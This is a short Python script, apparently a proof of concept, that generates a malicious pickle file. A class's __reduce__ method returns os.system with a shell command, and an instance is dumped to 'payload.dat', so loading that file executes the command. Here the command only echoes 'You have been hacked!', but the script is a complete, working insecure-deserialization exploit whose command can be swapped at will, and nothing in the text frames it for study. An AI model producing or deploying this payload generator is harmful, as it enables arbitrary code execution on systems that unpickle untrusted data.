import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

def serialize_exploit():
    with open('payload.dat', 'wb') as f:
        pickle.dump(VulnerableClass(), f)

serialize_exploit()
